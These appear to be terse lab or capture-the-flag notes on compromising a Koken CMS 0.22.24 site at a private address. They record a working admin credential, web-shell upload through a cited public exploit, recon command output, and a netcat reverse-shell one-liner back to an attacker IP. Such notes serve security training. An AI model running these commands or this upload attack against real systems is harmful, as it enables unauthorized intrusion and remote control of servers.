# 4 :8000 koken cms

```
http://192.168.71.76:8000/
Daisa Ahomi Website
Built w/ Koken

http://192.168.71.76:8000/admin/
# using the email
daisa@photographer.com:babygirl worked

# Koken CMS Exploit
http://192.168.71.76:8000/admin/#/settings
Version 0.22.24

Using https://www.exploit-db.com/exploits/48706

# web.php successfully uploaded

CMD: whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
photographer

CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.49.71 9090 >/tmp/f
# shell as www-data
```
